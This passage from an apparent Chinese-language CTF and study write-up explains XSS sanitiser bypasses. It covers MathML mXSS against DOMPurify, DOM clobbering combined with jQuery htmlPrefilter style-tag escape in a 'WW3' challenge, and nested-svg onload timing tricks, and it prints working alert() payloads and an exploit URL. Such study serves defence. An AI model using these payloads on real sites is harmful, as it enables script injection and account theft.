mtext 的直接子元素，在 MathML 命名空间中。因此， <code>style</code>  它也在 MathML 命名空间中，因此其内容不被视为文本。然后 <code>&lt;/math&gt;</code>  关闭 <code>&lt;math&gt;</code>  元素，现在 <code>img</code>  在 HTML 命名空间中创建，导致 XSS。</p>\n<p>payload2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;&lt;table id=&quot;&lt;/table&gt;&quot;&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104652050.png\" alt=\"image-20221009104652050\"></p>\n<p>经过二次解析后为</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104805809.png\" alt=\"image-20221009104805809\"></p>\n<h2 id=\"ww3\"><a class=\"markdownIt-Anchor\" href=\"#ww3\">#</a> WW3</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4NzU4NTQ4MzQtY2RiMDQyYjAtMTUwYS00ZmIzLWIyM2UtMmFlMmI5Zjk5ZTU1Lm1k\">📎World War 3.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span>Meme Code<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;form-control&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;meme-code&quot;</span> <span class=\"attr\">rows</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;notify&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    /* Utils */</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const escape = (dirty) =&gt; unescape(dirty).replace(/[<span class=\"tag\">&lt;&gt;</span>&#x27;&quot;=]/g, &#x27;&#x27;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeTemplate = (img, text) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        return (`<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"><span class=\"keyword\">@import</span> url(<span class=\"string\">&#x27;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#x27;</span>);`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&#123;<span class=\"attribute\">margin</span>:<span class=\"number\">0</span> auto;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">img</span>&#123;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">h1</span>&#123;<span class=\"attribute\">text-align</span>:center;<span class=\"attribute\">color</span>:<span class=\"number\">#fff</span>;<span class=\"attribute\">background</span>:black;<span class=\"attribute\">margin-top</span>:-<span class=\"number\">5px</span>;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"attribute\">position</span>:relative;<span class=\"attribute\">font-family</span>:Oswald,sans-serif;<span class=\"attribute\">font-weight</span>:<span class=\"number\">700</span>&#125;</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>`+</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;meme-card&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;$&#123;img&#125;&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>$&#123;text&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeGen = (that, notify) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        if (text &amp;&amp; img) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            template = memeTemplate(img, text)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            if (notify) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                html = (`<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;alert alert-warning&quot;</span> <span class=\"attr\">role</span>=<span class=\"string\">&quot;alert&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>Meme<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span> created from $&#123;DOMPurify.sanitize(text)&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            setTimeout(_ =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#status&#x27;).remove()</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#meme-code&#x27;).text(template)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;, 1000)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"comment\">/* Main */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> notify = <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> text = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> img = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;img&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;status&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;img class=&quot;circle&quot; src=&quot;<span class=\"subst\">$&#123;<span class=\"built_in\">escape</span>(img)&#125;</span>&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`Creating meme... (<span class=\"subst\">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        )</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        $(<span class=\"string\">&#x27;#meme-code&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"title function_\">memeTemplate</span>(<span class=\"string\">&#x27;https://i.imgur.com/PdbDexI.jpg&#x27;</span>, <span class=\"string\">&#x27;When you get that WW3 draft letter&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">//代码分析，Utils中为函数声明，main中调用了Utils中的函数</span><br><span class=\"line\">//img和text都被escape或者DOMPurify过滤，无法利用这两个参数</span><br><span class=\"line\">//只要text和img为真，会调用memeGen,memeGen会调用memeTemplate，memeTemplate将img和text写入Meme code中</span><br><span class=\"line\">//memeGen只有SetTimeout中notify存在利用点</span><br><span class=\"line\">//当img和text都为真时，会调用memeTemplate，在meme-code中写入该内容</span><br><span class=\"line\">//memeTemplate存在可控变量img和text，但img在src中，并且存在escape函数，无法闭合，只能利用text</span><br><span class=\"line\">//text需要传入两个值：第一个是为了执行jQuery解析而覆盖的notify，第二个是利用了第一个解析产生弹窗的代码</span><br><span class=\"line\">//通过<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">notify</span>&gt;</span>覆盖notify,通过<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>配合jQuery解析绕过domporify</span><br><span class=\"line\">//进入dompuriy过滤的是<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>,此代码被认为合法，但过滤之后又会被jQuery解析，变为：</span><br><span class=\"line\">//<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//  ,style被闭合，script标签逃逸,完成弹窗   </span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">//第一个img必须是合法的图片才能保证img和text同时为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 1 jquery script 标签逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">    $(&#x27;#status&#x27;).remove()</span><br><span class=\"line\">    notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span><br><span class=\"line\">    $(&#x27;#meme-code&#x27;).text(template)</span><br><span class=\"line\">&#125;, 1000)</span><br></pre></td></tr></table></figure>\n<p>两种解析 html 的方式:<strong>jquery.html&amp;innerhtml</strong>。 <code>innerHTML</code>  是原生 js 的写法， <code>Jqury.html()</code>  也是调用原生的 innerHTML 方法，但是加了自己的解析规则</p>\n<p>对于 innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时， <code>&lt;style&gt;</code>  标签中不允许存在子标签 (style 标签最初的设计理念就不能用来放子标签)，如果存在会被当作 text 解析。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style/&gt;&lt;script&gt;alert(1337)//</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>对于 <code>Jqury.html()</code> ，最终对标签的处理是在 <code>htmlPrefilter()</code>  中实现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^/&gt;x20trnf]*)[^&gt;]*)/&gt;/gi</span><br><span class=\"line\">jQuery.extend( &#123;</span><br><span class=\"line\">    htmlPrefilter: function( html ) &#123;</span><br><span class=\"line\">        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</span><br><span class=\"line\"></span><br><span class=\"line\">此处正则匹配完的结果$1和$2均为style</span><br></pre></td></tr></table></figure>\n<p>这个正则表达式在匹配 <code>&lt;*/&gt;</code>  之后会重新生成一对标签 (区别于直接调用 innerHTML)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1337)//</span><br></pre></td></tr></table></figure>\n<p>前置知识 2</p>\n<p>首先尝试用 DOM-clobbering 创造一个 id 为 <code>notify</code>  的变量，尝试覆盖 notify 使其变为真，走到为真的条件中，但是这种方式不允许覆盖已经存在的变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;img id=notify&gt;</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">const memeGen = (notify) =&gt;&#123;</span><br><span class=\"line\">    consol.log(notify);  //false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let notify = false;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>但我们可以通过 name 的局部作用域覆盖 notify</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img name=notify&gt;</span><br><span class=\"line\">此时notify为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 3：</p>\n<p>JS 局部作用域和全局作用域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#x27;dog&#x27;;console.log(nickname)&quot;&gt; //dog</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.document.nickname = &#x27;pig&#x27;;</span><br><span class=\"line\">window.nickname = &#x27;cat&#x27;;</span><br><span class=\"line\">&lt;script&gt;</span><br></pre></td></tr></table></figure>\n<p>在 document.write 中 notify 为 false，但通过 img 的局部作用域覆盖了 notify</p>\n<p>在 memeTemplate 中有如下语句：</p>\n<p><code>&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;$&#123;img&#125;&quot;&gt;&lt;h1&gt;$&#123;text&#125;&lt;/h1&gt;&lt;/div&gt;</code> )</p>\n<p>我们可以将局部作用域的 img 放入 text 中同时利用 jQuery 的解析绕过 dompurify 的过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?img=https://i.imgur.com/PdbDexI.jpg&amp;text=&lt;img%20name=notify&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()//</span><br></pre></td></tr></table></figure>\n<p>执行之后写入 memecode，div 中 script 标签被解析，完成弹窗</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012162102961.png\" alt=\"image-20221012162102961\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;</span><br><span class=\"line\">\t\t&lt;b&gt;Meme&lt;/b&gt; </span><br><span class=\"line\">\t\tcreated from </span><br><span class=\"line\">\t\t&lt;img name=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t\t&lt;style&gt;&lt;style&gt;&lt;/style&gt;</span><br><span class=\"line\">\t\t&lt;script&gt;alert()//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"svg深入研究\"><a class=\"markdownIt-Anchor\" href=\"#svg深入研究\">#</a> &lt;svg&gt; 深入研究</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br></pre></td></tr></table></figure>\n<p>HTML5 中 innerHtml 不执行插入的<script>标签</p>\n<p><strong>移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素</strong></p>\n<p>exp:  <code>&lt;img a src='a' b onerror=alert(1)&gt;</code></p>\n<p>因此我们一般不在同一个数组边循环边删除</p>\n<p>修复：先追加到数组中，在移除，即不要在源数组上操作</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = []</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         attrs.<span class=\"title function_ invoke__\">push</span>(attr.name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root); </span><br></pre></td></tr></table></figure>\n<p>使用以上修复后</p>\n<p>1. 别进循环</p>\n<p>2. 进循环别删有用数据</p>\n<p>method 1.(利用 html 页面渲染的竞争时间)</p>\n<p><code>&lt;svg&gt;&lt;svg onload=alert(1)&gt;</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM2MDcyNzk4NTEtY2UyNDFlNTItZDM4ZS00NWRjLTllZGMtODkxMTM2YTQ5OGI4Lm1k\">📎svg 的深度利用来绕过 waf.md</span></p>\n<p>1.1  <code>&lt;img src='1' onerror=&quot;alert(1)&quot;&gt;</code>  失败原因</p>\n<p>那么很明显， <code>alert(1)</code>  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： <strong>在 DOM 树构建完成以后，就会触发</strong> <code>DOMContentLoaded</code>  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 <code>load</code> <strong> 事件</strong>。</p>\n<p>页面的 JS 执行是会阻塞 DOM 树构建的。<strong>所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发</strong> <code>error</code> <strong> 事件</strong>。</p>\n<p>由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。</p>\n<p>1.2<svg><svg onload=alert(1)> 可以弹窗原因</p>\n<p>两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 <code>&lt;svg onload=alert(1)&gt;</code> ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败</p>\n<p>当我们没有正确闭合标签的时候，如 <code>&lt;svg&gt;&lt;svg&gt;</code> ，就可能调用到 <code>PopAll</code>  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 <code>PopCommon</code> 。这两个函数有一个共同点，都会调用栈中元素的 <code>FinishParsingChildren</code>  函数。这个函数用于处理子节点解析完毕以后的工作。</p>\n<p><code>FinishParsingChildren</code>  有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p>最外层 svg 的 <code>load</code>  事件由 <code>LocalDOMWindow::dispatchWindowLoadEvent</code>  触发；而其他 svg 的 <code>load</code>  事件则在达到结束标记的时候触发。</p>\n<p>先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行</p>\n<p>当没有过滤代码时：&lt;svg onload=console.log (“svg0”)&gt;&lt;svg onload=console.log (“svg1”)&gt;&lt;svg onload=console.log (“svg2”)&gt;</p>\n<p>触发顺序为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg2</span><br><span class=\"line\">svg1</span><br><span class=\"line\">DOMContentLoaded</span><br><span class=\"line\">svg0</span><br><span class=\"line\">load</span><br></pre></td></tr></table></figure>\n<p>套嵌的 svg 之所以成功，是因为当页面为 <code>root.innerHtml</code>  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中<strong>会触发非最外层 svg 标签的 <code>load</code>  事件，最终成功执行代码</strong>。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。</p>\n<p>1.3<svg onload=alert(1)> 失败原因</p>\n<p>这里有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p><code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>\n<p>最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。</p>\n<p>method 2. 使用 input 破坏 DOM</p>\n<p><code>&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;</code>   <code>&lt;form style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;</code>   <code>&lt;input 